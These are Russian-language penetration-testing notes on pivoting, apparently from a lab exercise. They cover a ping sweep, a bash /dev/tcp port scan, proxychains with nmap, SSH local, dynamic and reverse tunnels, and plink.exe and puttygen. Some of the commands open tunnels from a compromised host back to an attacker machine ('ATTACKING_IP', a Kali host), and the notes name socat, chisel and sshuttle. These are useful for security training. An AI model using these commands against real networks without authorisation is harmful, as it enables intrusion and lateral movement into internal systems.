# Pivoting - техника при которой скомпроментированная машина становится трамплином и весь трафик через нее перенаправляется во внутреннюю сеть.

# Сканирование сети через ping:

for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

# Proxychains

1. Копируем в локальную директорию конфигурацию proxy
cp /etc/proxychains4.conf .
2. Добавляем порт в файл
socks5 127.0.0.1 1080
3. Выполняем сканирование с указанием файла
proxychains -f ./proxychains4.conf nmap -sT -Pn -vv 10.200.10.0/24

# SSH tunneling/ Port forwarding

Пробрасывает один конкретный порт с удалённой машины на локальную:
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN

Создаёт SOCKS-прокси, через который можно направлять любой трафик куда угодно:
1. ssh -D 1337 user@172.16.0.5 -fN
2. Испольузем proxychains
socks5 127.0.0.1 1337
3. proxychains nmap 172.16.0.20


# Reverse Connection
Получить доступ к своей атакующей машине с цели, если на целевой машине нет ssh, а только reverse shell.
1. Генерируем пару ключей
ssh-keygen
2. В файле ~/.ssh/authorized_keys добавляем command, только для port-forwarding запрещая получить оболочку на атакующей машине
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa..................
3. Проверяем конфигурация ssh
sudo systemctl status ssh
4. Стартуем ssh
sudo systemctl start ssh
5. Запуск reverse connection на скомпрометированном сервере 
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN


# Plink.exe

If we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:

cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N

* ssh-keygen здесь не будет работать поэтому ключи надо преобразовать:
1. sudo apt install putty-tools
2. puttygen KEYFILE -o OUTPUT_KEY.ppk

# Другие инструменты для port forwaring и proxy:

- **socat** — один мощный швейцарский нож для одного соединения (перенаправить порт в порт, иногда обойти фаервол). Удобен, когда ничего другого нет, а статический бинарник закинуть можно.
- **chisel** — когда нет SSH-доступа (например, только шелл или RCE), но нужно поднять SOCKS или пробросить порты; работает и на Windows, умеет reverse-туннели (сам клиент стучится к тебе).
- **sshuttle** (требуется SSH и Python на целевой машине) — чтобы не возиться с proxychains, а просто ходить во внутреннюю сеть напрямую и выполнять все команды на атакующей машине как будто она в одной сети с целевой.